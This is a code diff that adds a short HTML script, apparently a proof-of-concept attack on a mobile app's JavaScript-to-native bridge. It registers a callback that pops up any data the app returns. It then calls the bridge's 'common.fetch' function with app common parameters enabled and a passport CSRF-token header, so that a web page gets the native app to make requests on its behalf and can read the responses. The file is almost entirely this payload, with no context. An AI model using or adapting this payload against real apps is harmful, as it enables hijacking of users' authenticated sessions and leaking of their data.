@@ -1,0 +1,8 @@
+<script>
+ var Native2JSBridge={};
+ Native2JSBridge._handleMessageFromApp=function(p1){
+ alert(JSON.stringify(p1));
+ }
+
+JS2NativeBridge.call('common.fetch','{"__callback_id":"1000","func":"common.fetch","params":{"addCommonParams":true,"url":"http://www.xxsnssdk.com","method":"GET","params":{},"header":{"x-tt-passport-csrf-token":""}},"JSSDK":1,"__msg_type":"call"}');
+</script>
